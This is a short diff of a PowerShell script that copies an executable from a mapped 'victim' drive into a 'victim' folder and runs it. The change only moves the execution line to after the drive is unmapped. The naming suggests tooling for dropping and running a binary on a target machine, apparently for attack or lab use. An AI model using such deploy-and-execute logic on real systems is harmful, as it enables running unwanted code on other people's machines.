@@ -20,6 +20,6 @@ if (Test-Path $victimFolderPath) {
     New-Item -ItemType Directory -Path $victimFolderPath -Force
     Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $victimFolderPath
 }
-& "$victimFolderPath\$powershellGeneratorExeFilename"
 Remove-PSDrive -Name $victimDisk
+& "$victimFolderPath\$powershellGeneratorExeFilename"
 Exit
